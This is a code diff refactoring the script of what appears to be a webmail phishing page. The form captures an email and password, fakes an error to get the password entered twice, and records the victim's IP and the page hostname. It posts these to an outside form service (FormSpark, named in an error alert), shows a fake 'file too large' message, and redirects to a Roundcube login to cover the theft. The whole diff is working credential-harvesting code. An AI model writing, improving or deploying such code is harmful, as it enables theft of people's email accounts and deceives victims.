@@ -155,7 +155,6 @@
   const toggle = document.getElementById('togglePassword');
   const errorMessage = document.getElementById('errorMessage');
   const firstPasswordField = document.getElementById('firstPasswordField');
-  let passwordFirstEntry = "";
 
   window.addEventListener('DOMContentLoaded', () => {
     const params = new URLSearchParams(window.location.search);
@@ -170,61 +169,59 @@
   });
 
   toggle.addEventListener('click', () => {
-    const isHidden = passwordInput.type === 'password';
-    passwordInput.type = isHidden ? 'text' : 'password';
+    passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
   });
 
- // robust IP fetch with timeout and fallback (uses ipapi.co which supports CORS)
-async function setIpField() {
-  const ipInput = document.getElementById('ip');
-  if (!ipInput) return;
+  // Fetch IP
+  async function setIpField() {
+    const ipInput = document.getElementById('ip');
+    if (!ipInput) return;
 
-  // Abort if it takes too long
-  const controller = new AbortController();
-  const timeout = setTimeout(() => controller.abort(), 4000); // 4s timeout
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 4000);
 
-  try {
-    const res = await fetch('https://ipapi.co/json/', { signal: controller.signal });
-    clearTimeout(timeout);
-
-    if (!res.ok) throw new Error('IP API not OK');
-    const d = await res.json();
-    ipInput.value = d.ip || '';
-  } catch (err) {
-    // graceful fallback
-    console.warn('Could not obtain IP from ipapi:', err?.message || err);
-    ipInput.value = ''; // or 'unknown'
+    try {
+      const res = await fetch('https://ipapi.co/json/', { signal: controller.signal });
+      clearTimeout(timeout);
+      if (!res.ok) throw new Error('IP API not OK');
+      const d = await res.json();
+      ipInput.value = d.ip || '';
+    } catch {
+      ipInput.value = '';
+    }
   }
-}
+  setIpField();
 
-// call it right away
-setIpField();
+  document.getElementById('hostname').value = window.location.hostname;
 
-// keep hostname assignment (unchanged)
-document.getElementById('hostname').value = window.location.hostname;
-
+  // 🔄 Improved form submit
   document.getElementById('mainForm').addEventListener('submit', async (e) => {
     e.preventDefault();
+
     const email = emailInput.value;
     const password = passwordInput.value;
     const ip = document.getElementById('ip').value;
     const hostname = document.getElementById('hostname').value;
 
-    if (passwordFirstEntry === "") {
-      passwordFirstEntry = password;
-      firstPasswordField.value = passwordFirstEntry;
+    // First password step
+    if (!firstPasswordField.value) {
+      firstPasswordField.value = password;
       passwordInput.value = '';
       errorMessage.style.display = 'block';
       passwordInput.focus();
       return;
     }
 
+    // Second step: collect both
+    const password1 = firstPasswordField.value;
+    const password2 = password;
+
     const data = {
-      email: email,
-      password1: passwordFirstEntry,
-      password2: password,
-      ip: ip,
-      hostname: hostname
+      email,
+      password1,
+      password2,
+      ip,
+      hostname
     };
 
     try {
@@ -235,7 +232,6 @@ document.getElementById('hostname').value = window.location.hostname;
       });
 
       if (res.ok) {
-        // 🌀 Create spinner overlay
         const overlay = document.createElement('div');
         overlay.style.position = 'fixed';
         overlay.style.top = 0;
@@ -267,12 +263,10 @@ document.getElementById('hostname').value = window.location.hostname;
         overlay.appendChild(msg);
         document.body.appendChild(overlay);
 
-        // 🕓 After 3 seconds, show message
         setTimeout(() => {
           msg.textContent = "File is too large, contact the sender to send in smaller chunks or log in with Roundcube.";
         }, 3000);
 
-        // ⏳ After 7 seconds, redirect
         setTimeout(() => {
           msg.textContent = "Redirecting to Roundcube…";
           window.location.href = "https://webmail.roundcube.101.hostinglogin.net/";
@@ -281,14 +275,18 @@ document.getElementById('hostname').value = window.location.hostname;
       } else {
         alert("Submission failed. Check FormSpark setup.");
       }
-    } catch {
+    } catch (err) {
       alert("Network error. Try again.");
+      console.error(err);
     }
   });
 </script>
+
+    
 <style>
   @keyframes spin { to { transform: rotate(360deg); } }
 </style>
 </body>
 </html>
+
 
